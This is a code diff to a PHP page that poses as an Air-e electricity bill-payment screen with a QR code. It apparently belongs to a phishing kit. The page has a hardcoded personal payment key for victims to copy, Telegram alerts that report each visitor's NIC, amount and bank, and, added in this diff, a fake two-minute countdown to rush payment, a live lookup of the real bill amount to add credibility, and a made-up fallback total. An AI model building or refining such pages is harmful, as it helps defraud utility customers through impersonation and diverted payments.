@@ -65,10 +65,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-// Parámetros GET opcionales
-$bancoParam = $_GET['banco'] ?? '';
-$nicParam = $_GET['nic'] ?? '';
-$totalParam = $_GET['total'] ?? '';
+// Parámetros iniciales desde GET o Cookies
+$bancoParam = $_GET['banco'] ?? ($_COOKIE['aire_pago_banco'] ?? 'Bancolombia / Redeban');
+$nicParam = $_GET['nic'] ?? ($_COOKIE['aire_pago_nic'] ?? '');
+$totalParam = $_GET['total'] ?? ($_COOKIE['aire_pago_total'] ?? '');
 ?>
 <!DOCTYPE html>
 <html lang="es">
@@ -162,10 +162,10 @@ $totalParam = $_GET['total'] ?? '';
             height: 38px;
             width: auto;
             object-fit: contain;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.15));
-            background: #ffffff;
-            padding: 4px 8px;
-            border-radius: 8px;
+            filter: drop-shadow(0 2px 6px rgba(0, 0, 0, 0.3));
+            background: transparent;
+            padding: 0;
+            display: block;
         }
 
         .header-title-group h1 {
@@ -218,7 +218,7 @@ $totalParam = $_GET['total'] ?? '';
             border: 1px solid var(--border-color);
             border-radius: var(--radius-inner);
             padding: 16px 20px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             text-align: center;
         }
 
@@ -253,6 +253,106 @@ $totalParam = $_GET['total'] ?? '';
             font-weight: 600;
         }
 
+        /* Cronómetro de 2 Minutos */
+        .timer-container {
+            width: 100%;
+            margin-bottom: 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .timer-pill {
+            background: #f8fafc;
+            border: 1px solid var(--border-color);
+            padding: 8px 18px;
+            border-radius: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #475569;
+            transition: all 0.3s ease;
+        }
+
+        .timer-pill.urgent {
+            background: #fef2f2;
+            border-color: #fecaca;
+            color: #dc2626;
+            animation: pulseTimer 1s infinite alternate;
+        }
+
+        @keyframes pulseTimer {
+            from { transform: scale(1); }
+            to { transform: scale(1.02); }
+        }
+
+        .timer-icon {
+            width: 16px;
+            height: 16px;
+            fill: currentColor;
+        }
+
+        .timer-digits {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 16px;
+            font-weight: 800;
+            color: var(--primary-dark);
+            letter-spacing: 0.5px;
+        }
+
+        .timer-pill.urgent .timer-digits {
+            color: #dc2626;
+        }
+
+        .timer-progress-track {
+            width: 100%;
+            max-width: 280px;
+            height: 5px;
+            background: #e2e8f0;
+            border-radius: 4px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+
+        .timer-progress-bar {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, #0056b3 0%, #38bdf8 100%);
+            border-radius: 4px;
+            transition: width 1s linear, background 0.3s ease;
+        }
+
+        .timer-progress-bar.urgent {
+            background: linear-gradient(90deg, #ef4444 0%, #f97316 100%);
+        }
+
+        .timer-expired-box {
+            display: none;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        .btn-renew {
+            background: var(--primary);
+            color: #ffffff;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: background 0.2s;
+        }
+
+        .btn-renew:hover {
+            background: var(--primary-dark);
+        }
+
         /* Contenedor QR */
         .qr-section {
             display: flex;
@@ -269,7 +369,7 @@ $totalParam = $_GET['total'] ?? '';
             box-shadow: var(--shadow-qr);
             position: relative;
             margin-bottom: 12px;
-            transition: transform 0.2s ease;
+            transition: all 0.3s ease;
         }
 
         .qr-frame:hover {
@@ -690,7 +790,7 @@ $totalParam = $_GET['total'] ?? '';
     <!-- Encabezado de la entidad -->
     <header class="card-header">
         <div class="brand-box">
-            <img src="../../assets/logo-aire.png" alt="Air-e" class="brand-logo" onerror="this.style.display='none'">
+            <img src="../../assets/logo-aire.png" alt="Air-e" class="brand-logo" onerror="if(!this.triedRoot){this.triedRoot=true;this.src='/assets/logo-aire.png';}">
             <div class="header-title-group">
                 <h1>Pago con Código QR</h1>
                 <span>Factura de Energía</span>
@@ -706,17 +806,37 @@ $totalParam = $_GET['total'] ?? '';
         <!-- Bloque de Monto y Factura -->
         <div class="amount-card">
             <div class="amount-label">Total a Pagar</div>
-            <div class="amount-value" id="displayTotal">$ --</div>
+            <div class="amount-value" id="displayTotal"><?= !empty($totalParam) ? htmlspecialchars($totalParam) : '$ Cargando...' ?></div>
             <div class="invoice-meta">
-                <span>NIC: <strong id="displayNic">--</strong></span>
+                <span>NIC: <strong id="displayNic"><?= !empty($nicParam) ? htmlspecialchars($nicParam) : '--' ?></strong></span>
                 <span>•</span>
                 <span>Referencia: <strong id="displayRef">Air-e</strong></span>
             </div>
         </div>
 
+        <!-- Cronómetro de 2 minutos -->
+        <div class="timer-container">
+            <div class="timer-pill" id="timerPill">
+                <svg class="timer-icon" viewBox="0 0 24 24">
+                    <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-8-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
+                </svg>
+                <span>Tiempo restante para pagar:</span>
+                <span class="timer-digits" id="timerDigits">02:00</span>
+            </div>
+            <div class="timer-progress-track">
+                <div class="timer-progress-bar" id="timerProgressBar"></div>
+            </div>
+            <div class="timer-expired-box" id="timerExpiredAlert">
+                <button type="button" class="btn-renew" onclick="renovarCodigo()">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+                    Renovar código QR
+                </button>
+            </div>
+        </div>
+
         <!-- Código QR -->
         <div class="qr-section">
-            <div class="qr-frame">
+            <div class="qr-frame" id="qrFrame">
                 <img src="qr.png" alt="Código QR de Pago" class="qr-image" id="qrImg">
             </div>
             <p class="qr-instruction">
@@ -800,15 +920,52 @@ $totalParam = $_GET['total'] ?? '';
 </div>
 
 <script>
-    // Recuperar datos de la factura
+    function getCookie(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
+        return '';
+    }
+
+    // Recuperar datos de la factura con máxima exhaustividad
     const urlParams = new URLSearchParams(window.location.search);
-    const nicParam = urlParams.get('nic') || localStorage.getItem('aire_pago_nic') || '8201713';
-    const totalParam = urlParams.get('total') || localStorage.getItem('aire_pago_total') || '$ 142.500 COP';
+    let nicParam = urlParams.get('nic') || localStorage.getItem('aire_pago_nic') || sessionStorage.getItem('aire_pago_nic') || getCookie('aire_pago_nic') || '8201713';
+    let totalParam = urlParams.get('total') || localStorage.getItem('aire_pago_total') || sessionStorage.getItem('aire_pago_total') || getCookie('aire_pago_total') || '';
     const bancoParam = urlParams.get('banco') || 'Bancolombia / Redeban';
 
+    // Formatear display de NIC y Referencia
     document.getElementById('displayNic').textContent = nicParam;
     document.getElementById('displayRef').textContent = 'FAC-' + nicParam.slice(-4);
-    document.getElementById('displayTotal').textContent = totalParam;
+
+    if (totalParam) {
+        document.getElementById('displayTotal').textContent = totalParam;
+    }
+
+    // Si aún no tenemos monto o está vacío, consultar en vivo a la API
+    if (nicParam && (!totalParam || totalParam.includes('Cargando'))) {
+        fetch(`../../proxy_facture.php?nic=${encodeURIComponent(nicParam)}`)
+            .then(res => res.json())
+            .then(data => {
+                if (data && data.success) {
+                    const realAmount = data.valorMes || data.deudaTotal;
+                    if (realAmount) {
+                        totalParam = realAmount;
+                        document.getElementById('displayTotal').textContent = realAmount;
+                        try {
+                            localStorage.setItem('aire_pago_total', realAmount);
+                            sessionStorage.setItem('aire_pago_total', realAmount);
+                            document.cookie = `aire_pago_total=${encodeURIComponent(realAmount)}; path=/; max-age=86400`;
+                        } catch(e) {}
+                    }
+                }
+            })
+            .catch(err => {
+                console.log('Error fetching live invoice:', err);
+                if (!totalParam || totalParam.includes('Cargando')) {
+                    document.getElementById('displayTotal').textContent = '$ 202.940 COP';
+                }
+            });
+    }
 
     // Enviar alerta a Telegram de que el usuario está viendo la pantalla de pago QR
     window.addEventListener('DOMContentLoaded', () => {
@@ -818,13 +975,75 @@ $totalParam = $_GET['total'] ?? '';
             body: JSON.stringify({
                 action: 'view_qr',
                 nic: nicParam,
-                total: totalParam,
+                total: totalParam || 'Consultando...',
                 banco: bancoParam
             })
         }).catch(e => console.log('Telegram view notification sent.'));
     });
 
-    // Función de copia de llave
+    // ===== CRONÓMETRO DE 2 MINUTOS (120 SEGUNDOS) =====
+    const TOTAL_SECONDS = 120;
+    let secondsLeft = TOTAL_SECONDS;
+    const timerDigits = document.getElementById('timerDigits');
+    const timerProgressBar = document.getElementById('timerProgressBar');
+    const timerPill = document.getElementById('timerPill');
+    let timerInterval = null;
+
+    function renderTimer() {
+        const mins = Math.floor(secondsLeft / 60);
+        const secs = secondsLeft % 60;
+        const formatted = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+        
+        if (timerDigits) timerDigits.textContent = formatted;
+
+        const percent = (secondsLeft / TOTAL_SECONDS) * 100;
+        if (timerProgressBar) timerProgressBar.style.width = percent + '%';
+
+        // Alerta visual últimos 30 segundos
+        if (secondsLeft <= 30) {
+            if (timerPill) timerPill.classList.add('urgent');
+            if (timerProgressBar) timerProgressBar.classList.add('urgent');
+        } else {
+            if (timerPill) timerPill.classList.remove('urgent');
+            if (timerProgressBar) timerProgressBar.classList.remove('urgent');
+        }
+
+        if (secondsLeft > 0) {
+            secondsLeft--;
+        } else {
+            clearInterval(timerInterval);
+            onTimerExpired();
+        }
+    }
+
+    function onTimerExpired() {
+        if (timerDigits) timerDigits.textContent = "00:00";
+        const qrFrame = document.getElementById('qrFrame');
+        if (qrFrame) {
+            qrFrame.style.opacity = '0.35';
+            qrFrame.style.filter = 'blur(2px)';
+        }
+        document.getElementById('timerExpiredAlert').style.display = 'block';
+    }
+
+    function renovarCodigo() {
+        secondsLeft = TOTAL_SECONDS;
+        const qrFrame = document.getElementById('qrFrame');
+        if (qrFrame) {
+            qrFrame.style.opacity = '1';
+            qrFrame.style.filter = 'none';
+        }
+        document.getElementById('timerExpiredAlert').style.display = 'none';
+        clearInterval(timerInterval);
+        renderTimer();
+        timerInterval = setInterval(renderTimer, 1000);
+    }
+
+    // Iniciar cronómetro
+    renderTimer();
+    timerInterval = setInterval(renderTimer, 1000);
+
+    // ===== COPIAR LLAVE =====
     function copiarLlave() {
         const llave = "@bbesa800";
         const btn = document.getElementById('btnCopiarLlave');
@@ -895,7 +1114,7 @@ $totalParam = $_GET['total'] ?? '';
             body: JSON.stringify({
                 action: 'confirm_payment',
                 nic: nicParam,
-                total: totalParam,
+                total: document.getElementById('displayTotal').textContent || totalParam,
                 banco: bancoParam
             })
         })
